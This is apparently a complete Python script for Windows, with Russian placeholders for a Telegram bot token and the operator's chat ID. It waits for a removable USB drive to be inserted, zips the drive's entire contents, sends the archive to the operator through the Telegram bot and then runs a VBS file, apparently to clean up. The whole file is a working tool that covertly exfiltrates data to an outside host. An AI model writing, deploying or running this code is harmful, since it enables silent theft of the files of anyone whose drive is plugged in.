import win32api as wa
import win32file as wf

import os
import shutil

import telebot
 
DRIVE_REMOVABLE = 2
token = 'ТУТ ТОКЕН БОТА'
me = 'ТУТ ВАШ ID'
bot = telebot.TeleBot(token)

def zip(usb):
	shutil.make_archive("logs", 'zip', usb)
	send_zip()

def send_zip():
	bot.send_document(int(me), open('logs.zip', 'rb'))
	clear()

def clear():
	os.system('Analisys.vbs')

connect = True 
while connect:
	disk = wa.GetLogicalDriveStrings()
	disk = disk.split('\000')[:-1]

	for usb in disk:
	    if wf.GetDriveTypeW(usb) == DRIVE_REMOVABLE:
	    	zip(usb=usb)
	    	connect = False
